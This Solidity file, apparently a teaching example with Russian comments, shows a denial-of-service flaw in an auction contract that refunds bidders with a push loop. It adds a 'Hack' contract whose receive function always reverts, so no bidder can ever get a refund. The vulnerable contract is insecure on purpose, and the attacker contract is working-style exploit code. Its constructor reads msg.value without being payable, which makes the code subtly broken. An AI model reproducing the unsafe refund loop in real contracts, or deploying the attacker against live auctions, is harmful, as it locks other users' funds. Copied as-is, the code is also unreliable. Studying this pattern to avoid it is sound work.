// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract AuctionDenialOfService {
    mapping(address bidder => uint) public bids;
    address[] public bidders;

    function bid() external payable {
        bids[msg.sender] += msg.value;
        bidders.push(msg.sender);
    }

        // pull необходимо использовать данный паттерн, когда участник сам запрашивает возврат средств

        // push небезопасный подход, т.к. возврат происходит с нашего смартконтракта и дает возможность для Denial of service
    function refund() external {
        for(uint i = 0; i < bidders.length; ++i) {
            address currentBidder = bidders[i];

            uint refundAmount = bids[currentBidder];

            bids[currentBidder] = 0;

            if(refundAmount > 0) {
                (bool ok,) = currentBidder.call{value: refundAmount}("");
                require(ok, "can`t send");
            }
        }
    }
}


contract Hack {
    AuctionDenialOfService toHack;
    uint constant BID_AMOUNT = 100;
    bool isHackingEnabled = true;

    constructor(address _toHack) {
        require(msg.value == BID_AMOUNT);

        toHack = AuctionDenialOfService(_toHack);
        toHack.bid{value: msg.value}();
    }

    function disableHacking() external {
        isHackingEnabled = false;
    }

    receive() external payable {
        if(isHackingEnabled) {
            assert(false);
        }
    }
}